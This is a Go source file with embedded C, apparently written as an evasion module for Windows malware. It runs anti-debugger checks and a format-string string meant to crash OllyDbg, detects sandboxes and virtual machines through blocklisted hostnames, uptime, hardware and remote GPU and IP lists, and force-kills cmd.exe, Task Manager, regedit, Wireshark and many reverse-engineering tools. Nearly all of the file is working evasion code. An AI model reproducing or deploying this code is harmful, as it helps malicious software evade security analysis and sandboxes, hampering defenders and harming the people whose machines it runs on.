package main

/*
#include <windows.h>
#include <winternl.h>
#include <process.h>

// C Part CODED BY MUZA

typedef NTSTATUS(WINAPI *NtSetInformationThread)(IN HANDLE, IN THREADINFOCLASS, IN PVOID, IN ULONG);

void hehehidehthread() {
    NtSetInformationThread pNtSetInformationThread = (NtSetInformationThread)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtSetInformationThread");
    if (pNtSetInformationThread != NULL) {
        THREADINFOCLASS ThreadHideFromDebugger = (THREADINFOCLASS)0x11;
        pNtSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, NULL, 0);
    }
}
BOOL checksysreq() {
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 2) return FALSE;

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = (DWORD)(memoryStatus.ullTotalPhys / (1024 * 1024));
    if (RAMMB < 2048) return FALSE;

    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) return FALSE;

    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    if (!DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL)) {
        CloseHandle(hDevice);
        return FALSE;
    }

    DWORD diskSizeGB = (DWORD)(pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / (1024 * 1024 * 1024));
    CloseHandle(hDevice);
    if (diskSizeGB < 100) return FALSE;

	
    return TRUE;
}

ULONGLONG GetTickCount64();


*/

// coded by codepulze and muza 
import "C"
import (
	"fmt"
	"syscall"
	"unsafe"
	"os/exec"
	"os"
	"strings"
	"encoding/json"
	"io/ioutil"
	"net/http"
)

var (
	mu32   = syscall.NewLazyDLL("user32.dll")
	pew          = mu32.NewProc("EnumWindows")
	pgwt       = mu32.NewProc("GetWindowTextA")
	pgwtp = mu32.NewProc("GetWindowThreadProcessId")
	mk32 = syscall.NewLazyDLL("kernel32.dll")
	pop         = mk32.NewProc("OpenProcess")
	ptp    = mk32.NewProc("TerminateProcess")
	pch         = mk32.NewProc("CloseHandle")
	pidp = mk32.NewProc("IsDebuggerPresent")
    crdp = mk32.NewProc("CheckRemoteDebuggerPresent")

	pep = mk32.NewProc("K32EnumProcesses")


    // i stopped writing like lazy mf, i think this project will be updated so i just started writing clean on 04/04/2024
	// I think that this project can be usefull and it has no reason for me to write like noobie... so no loger rand var names
	ntdll                      = syscall.NewLazyDLL("ntdll.dll")
	ntClose                    = ntdll.NewProc("NtClose")
	createMutex               = syscall.NewLazyDLL("kernel32.dll").NewProc("CreateMutexA")
	setHandleInformation      = syscall.NewLazyDLL("kernel32.dll").NewProc("SetHandleInformation")
	
	handleFlagProtectFromClose = uint32(0x00000002)

	///////////////////// exploiting log console 
	k32             = syscall.MustLoadDLL("kernel32.dll")
	DebugStrgingA   = k32.MustFindProc("OutputDebugStringA")
	gle         = k32.MustFindProc("GetLastError")
	
)

func hehehidehthread() {
    C.hehehidehthread()
}

func NtCloseAntiDebug_InvalidHandle() bool {
	r1, _, _ := ntClose.Call(uintptr(0x1231222))
	return r1 != 0
}

func NtCloseAntiDebug_ProtectedHandle() bool {
	r1, _, _ := createMutex.Call(0, 0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(fmt.Sprintf("%d", 1234567)))))
	hMutex := uintptr(r1)
	r1, _, _ = setHandleInformation.Call(hMutex, uintptr(handleFlagProtectFromClose), uintptr(handleFlagProtectFromClose))
	if r1 == 0 {
		return false
	}
	r1, _, _ = ntClose.Call(hMutex)
	return r1 != 0
}

func HardwareRegistersBreakpointsDetection() bool {
    const CONTEXT_DEBUG_REGISTERS = 0x00010000 | 0x00000010
    var context C.CONTEXT
    context.ContextFlags = C.CONTEXT_DEBUG_REGISTERS
    if C.GetThreadContext(C.GetCurrentThread(), &context) != 0 {
        if context.Dr1 != 0 || context.Dr2 != 0 || context.Dr3 != 0 || context.Dr7 != 0 {
            return true
        }
        dr := *(*[2]C.ULONG_PTR)(unsafe.Pointer(&context.R8)) 
        if dr[0] != 0 || dr[1] != 0 {
            return true
        }
    }
    return false
}


func OutputDebugStringAntiDebug() bool {
	naughty := "hm"
	txptr, _ := syscall.UTF16PtrFromString(naughty)
	DebugStrgingA.Call(uintptr(unsafe.Pointer(txptr)))
	ret, _, _ := gle.Call()
	return ret == 0
}

func OllyDbgExploit(text string) {
    txptr, err := syscall.UTF16PtrFromString(text)
    if err != nil {
        panic(err)
    }
    DebugStrgingA.Call(uintptr(unsafe.Pointer(txptr)))
}



func main() {
	for {
		// for debuggers like x64dbg or any other
		OutputDebugStringAntiDebug()
		// this is for ollydbg 
		OllyDbgExploit("%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s")
		/////////////////////////////
		//hehehidehthread()
		if HardwareRegistersBreakpointsDetection() {
			os.Exit(1)
		}
		fmt.Println(NtCloseAntiDebug_InvalidHandle())
        fmt.Println(NtCloseAntiDebug_ProtectedHandle())

		// is debugger present check below
		flag, _, _ := pidp.Call()
		if flag != 0 {
			fmt.Println("xd isdebugpres is detected")
			os.Exit(-1)
		}
		var isremdebpres bool
        crdp.Call(^uintptr(0), uintptr(unsafe.Pointer(&isremdebpres)))
        if isremdebpres {
            fmt.Println("xd remote debug is detected")
            os.Exit(-1)
        }
		// new check
		if gpuchk() {
			syscall.Exit(-1)
		}

		fmt.Println("gpu is clean")

		// pc name check
		badpcname := []string{"00900BC83803", "0CC47AC83803", "6C4E733F-C2D9-4", "ACEPC", "AIDANPC", "ALENMOOS-PC", "ALIONE", "APPONFLY-VPS", "ARCHIBALDPC", "azure", "B30F0242-1C6A-4", "BAROSINO-PC", "BECKER-PC", "BEE7370C-8C0C-4", "COFFEE-SHOP", "COMPNAME_4047", "d1bnJkfVlH", "DESKTOP-19OLLTD", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "DESKTOP-4U8DTF8", "DESKTOP-54XGX6F", "DESKTOP-5OV9S0O", "DESKTOP-6AKQQAM", "DESKTOP-6BMFT65", "DESKTOP-70T5SDX", "DESKTOP-7AFSTDP", "DESKTOP-7XC6GEZ", "DESKTOP-8K9D93B", "DESKTOP-AHGXKTV", "DESKTOP-ALBERTO", "DESKTOP-B0T93D6", "DESKTOP-BGN5L8Y", "DESKTOP-BUGIO", "DESKTOP-BXJYAEC", "DESKTOP-CBGPFEE", "DESKTOP-CDQE7VN", "DESKTOP-CHAYANN", "DESKTOP-CM0DAW8", "DESKTOP-CNFVLMW", "DESKTOP-CRCCCOT", "DESKTOP-D019GDM", "DESKTOP-D4FEN3M", "DESKTOP-DE369SE", "DESKTOP-DIL6IYA", "DESKTOP-ECWZXY2", "DESKTOP-F7BGEN9", "DESKTOP-FSHHZLJ", "DESKTOP-G4CWFLF", "DESKTOP-GELATOR", "DESKTOP-GLBAZXT", "DESKTOP-GNQZM0O", "DESKTOP-GPPK5VQ", "DESKTOP-HASANLO", "DESKTOP-HQLUWFA", "DESKTOP-HSS0DJ9", "DESKTOP-IAPKN1P", "DESKTOP-IFCAQVL", "DESKTOP-ION5ZSB", "DESKTOP-JQPIFWD", "DESKTOP-KALVINO", "DESKTOP-KOKOVSK", "DESKTOP-NAKFFMT", "DESKTOP-NKP0I4P", "DESKTOP-NM1ZPLG", "DESKTOP-NTU7VUO", "DESKTOP-QUAY8GS", "DESKTOP-RCA3QWX", "DESKTOP-RHXDKWW", "DESKTOP-S1LFPHO", "DESKTOP-SUPERIO", "DESKTOP-V1L26J5", "DESKTOP-VIRENDO", "DESKTOP-VKNFFB6", "DESKTOP-VRSQLAG", "DESKTOP-VWJU7MF", "DESKTOP-VZ5ZSYI", "DESKTOP-W8JLV9V", "DESKTOP-WG3MYJS", "DESKTOP-WI8CLET", "DESKTOP-XOY7MHS", "DESKTOP-Y8ASUIL", "DESKTOP-YW9UO1H", "DESKTOP-ZJF9KAN", "DESKTOP-ZMYEHDA", "DESKTOP-ZNCAEAM", "DESKTOP-ZOJJ8KL", "DESKTOP-ZV9GVYL", "DOMIC-DESKTOP", "EA8C2E2A-D017-4", "ESPNHOOL", "GANGISTAN", "GBQHURCC", "GRAFPC", "GRXNNIIE", "gYyZc9HZCYhRLNg", "JBYQTQBO", "JERRY-TRUJILLO", "JOHN-PC", "JUDES-DOJO", "JULIA-PC", "LANTECH-LLC", "LISA-PC", "LOUISE-PC", "LUCAS-PC", "MIKE-PC", "NETTYPC", "ORELEEPC", "ORXGKKZC", "Paul Jones", "PC-DANIELE", "PROPERTY-LTD", "Q9IATRKPRH", "QarZhrdBpj", "RALPHS-PC", "SERVER-PC", "SERVER1", "Steve", "SYKGUIDE-WS17", "T00917", "test42", "TIQIYLA9TW5M", "TMKNGOMU", "TVM-PC", "VONRAHEL", "WILEYPC", "WIN-5E07COS9ALR", "WINDOWS-EEL53SN", "WINZDS-1BHRVPQU", "WINZDS-22URJIBV", "WINZDS-3FF2I9SN", "WINZDS-5J75DTHH", "WINZDS-6TUIHN7R", "WINZDS-8MAEI8E4", "WINZDS-9IO75SVG", "WINZDS-AM76HPK2", "WINZDS-B03L9CEO", "WINZDS-BMSMD8ME", "WINZDS-BUAOKGG1", "WINZDS-K7VIK4FC", "WINZDS-QNGKGN59", "WINZDS-RST0E8VU", "WINZDS-U95191IG", "WINZDS-VQH86L5D", "WINZDS-MILOBM35", "WINZDS-PU0URPVI", "ABIGAI", "JUANYARO", "floppy", "CATWRIGHT", "llc"}

		cpcn, _ := os.Hostname()

		for _, pat := range badpcname {
			if strings.Contains(cpcn, pat) {
				os.Exit(-1)
			}
		}
		fmt.Println("PC Name is not bad")
		//pc name check

		// ip check
		cip()

		// pc uptime lol
		var uptime uint64 = uint64(C.GetTickCount64()) / 1000
		if uptime < 1200 {
			os.Exit(-1)
		} else {
			fmt.Println("System uptime is not sus")
		}
		// sys reqs, we will be checking for workstations (VT)
		if C.checksysreq() == 1 {
			fmt.Println("passed")
		} else {
			os.Exit(-1)
		}
		// Check Processes (Workstations have most of the time less than 50)
		count := rpc()
		if count < 50 {
			return
		}

		// kill blacklisted processes (can by bypassed)
		ptk := []string{"cmd.exe", "taskmgr.exe", "process.exe", "processhacker.exe", "ksdumper.exe", "fiddler.exe", "httpdebuggerui.exe", "wireshark.exe", "httpanalyzerv7.exe", "fiddler.exe", "decoder.exe", "regedit.exe", "procexp.exe", "dnspy.exe", "vboxservice.exe", "burpsuit.exe", "DbgX.Shell.exe", "ILSpy.exe"}

		for _, prg := range ptk {
			exec.Command("taskkill", "/F", "/IM", prg).Run()
		}

		//check windows
		ewp := syscall.NewCallback(ewpg)
		ret, _, _ := pew.Call(ewp, 0)
		if ret == 0 {
			return
		}
	}
}

func gpuchk() bool {
	gpuuri := "https://rentry.co/povewdm6/raw"
	gpucm := exec.Command("curl", gpuuri)
	ou, _ := gpucm.Output()

	gpul := string(ou)
    //might trigger WST > WMIC LOL.
	ou, _ = exec.Command("cmd", "/C", "wmic path win32_videocontroller get name").Output()
	gpun := strings.TrimSpace(strings.Split(string(ou), "\n")[1])

	return strings.Contains(gpul, gpun)
	//gpu check, also im trying to write this readable way :c..
}



func rpc() int {
	// current running proceesses
	var ids [1024]uint32
	var needed uint32

	pep.Call(uintptr(unsafe.Pointer(&ids)),uintptr(len(ids)),uintptr(unsafe.Pointer(&needed)),)

	return int(needed / 4)
}

func cip() {
	// ip check
	iplst, _ := http.Get("https://rentry.co/hikbicky/raw")
	defer iplst.Body.Close()
	ipdat, _ := http.Get("https://api.ipify.org/?format=json")
	defer ipdat.Body.Close()
	ipbyt, _ := ioutil.ReadAll(iplst.Body)
	var dat map[string]string
	json.NewDecoder(ipdat.Body).Decode(&dat)
	if string(ipbyt) == dat["ip"] {
		os.Exit(-1)
	}
}


func ewpg(hwnd uintptr, lParam uintptr) uintptr {
	// blaccklisted window manes
	var pid uint32
	pgwtp.Call(hwnd, uintptr(unsafe.Pointer(&pid)))

	var title [256]byte
	pgwt.Call(hwnd, uintptr(unsafe.Pointer(&title)), 256)
	wt := string(title[:])

	bs := []string{
		"proxifier", "graywolf", "extremedumper", "zed", "exeinfope", "dnspy",
		"titanHide", "ilspy", "titanhide", "x32dbg", "codecracker", "simpleassembly",
		"process hacker 2", "pc-ret", "http debugger", "Centos", "process monitor",
		"debug", "ILSpy", "reverse", "simpleassemblyexplorer", "process", "de4dotmodded",
		"dojandqwklndoqwd-x86", "sharpod", "folderchangesview", "fiddler", "die", "pizza",
		"crack", "strongod", "ida -", "brute", "dump", "StringDecryptor", "wireshark",
		"debugger", "httpdebugger", "gdb", "kdb", "x64_dbg", "windbg", "x64netdumper",
		"petools", "scyllahide", "megadumper", "reversal", "ksdumper v1.1 - by equifox",
		"dbgclr", "HxD", "monitor", "peek", "ollydbg", "ksdumper", "http", "wpe pro", "dbg",
		"httpanalyzer", "httpdebug", "PhantOm", "kgdb", "james", "x32_dbg", "proxy", "phantom",
		"mdbg", "WPE PRO", "system explorer", "de4dot", "X64NetDumper", "protection_id",
		"charles", "systemexplorer", "pepper", "hxd", "procmon64", "MegaDumper", "ghidra", "xd",
		"0harmony", "dojandqwklndoqwd", "hacker", "process hacker", "SAE", "mdb", "checker",
		"harmony", "Protection_ID", "PETools", "scyllaHide", "x96dbg", "systemexplorerservice",
		"folder", "mitmproxy", "dbx", "sniffer", "Process Hacker",
	}

	for _, str := range bs {
		if contains(wt, str) {
			proc, _, _ := pop.Call(syscall.PROCESS_TERMINATE, 0, uintptr(pid))
			if proc != 0 {
				ptp.Call(proc, 0)
				pch.Call(proc)
			}
			syscall.Exit(0)
		}
	}

	return 1
}

func contains(s, substr string) bool {
	// pattern finding for the widnows lol
	return len(s) >= len(substr) && s[:len(substr)] == substr
}